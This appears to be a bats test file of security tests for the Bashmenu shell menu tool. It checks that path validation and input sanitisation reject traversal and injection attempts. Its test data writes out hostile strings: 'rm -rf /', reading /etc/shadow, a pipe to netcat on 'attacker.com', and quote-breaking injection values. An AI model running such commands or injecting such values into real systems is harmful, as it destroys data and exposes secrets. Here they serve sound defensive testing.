#!/usr/bin/env bats
# =============================================================================
# Security Tests for Bashmenu
# =============================================================================
# Description: Security-focused tests
# Version:     1.0
# =============================================================================

# Load bashmenu modules for testing
load ../src/menu.sh
load ../src/script_validator.sh

@test "script path validation prevents directory traversal attacks" {
    # Test various directory traversal attempts
    run validate_script_path "../../../etc/passwd"
    [ "$status" -eq 1 ]
    
    run validate_script_path "./../../../etc/passwd"
    [ "$status" -eq 1 ]
    
    run validate_script_path "..\\..\\windows\\system32"
    [ "$status" -eq 1 ]
}

@test "script path validation rejects command injection attempts" {
    run validate_script_path "script.sh; rm -rf /"
    [ "$status" -eq 1 ]
    
    run validate_script_path "script.sh && cat /etc/shadow"
    [ "$status" -eq 1 ]
    
    run validate_script_path "script.sh | nc attacker.com 4444"
    [ "$status" -eq 1 ]
}

@test "script path validation handles null bytes" {
    run validate_script_path "script.sh\x00/etc/passwd"
    [ "$status" -eq 1 ]
}

@test "script execution validation checks file existence" {
    run validate_script_execution "/nonexistent/script.sh"
    [ "$status" -eq 1 ]
}

@test "script execution validation checks permissions" {
    # Create a non-executable file for testing
    echo "#!/bin/bash" > /tmp/test_script.sh
    chmod 644 /tmp/test_script.sh
    
    run validate_script_execution "/tmp/test_script.sh"
    [ "$status" -eq 1 ]
    
    # Cleanup
    rm -f /tmp/test_script.sh
}

@test "script wrapper creation prevents code injection" {
    # Test with malicious script name
    local malicious_name="'; rm -rf /; echo 'safe"
    run create_script_wrapper "$malicious_name" "/bin/echo" ""
    
    # The function should not execute malicious code
    # This is a basic test - more thorough testing would require complex mocking
}

@test "input sanitization removes dangerous characters" {
    local dangerous_input="test; rm -rf /"
    local sanitized=$(sanitize_input "$dangerous_input")
    
    [[ ! "$sanitized" =~ ";" ]]
    [[ ! "$sanitized" =~ "rm" ]]
}

@test "function name generation is safe" {
    local dangerous_name="'; rm -rf /; echo 'test"
    local safe_name="exec_${dangerous_name//[^a-zA-Z0-9_]/_}"
    
    # Safe name should only contain valid function characters
    [[ "$safe_name" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]]
}

@test "whitelist enforcement works correctly" {
    # This test would require mocking ALLOWED_SCRIPT_DIRS
    # For now, we test the concept exists
    run grep -q "ALLOWED_SCRIPT_DIRS" ../src/script_validator.sh
    [ "$status" -eq 0 ]
}

@test "parameter validation prevents injection" {
    # Test parameter collection sanitization
    # This would need access to internal functions
    run grep -q "sanitize" ../src/menu.sh
    [ "$status" -eq 0 ]
}